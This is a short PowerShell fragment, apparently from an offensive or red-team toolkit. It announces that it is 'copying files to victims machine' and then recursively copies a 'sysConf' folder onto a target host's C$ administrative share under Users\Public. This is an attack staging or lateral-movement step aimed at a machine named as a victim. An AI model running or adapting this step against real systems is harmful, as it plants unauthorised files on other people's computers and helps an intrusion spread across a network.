﻿Write-Output 'Copying files to victims machine'
cp -R sysConf \\$Victim\c$\Users\Public\
Write-Output 'Done'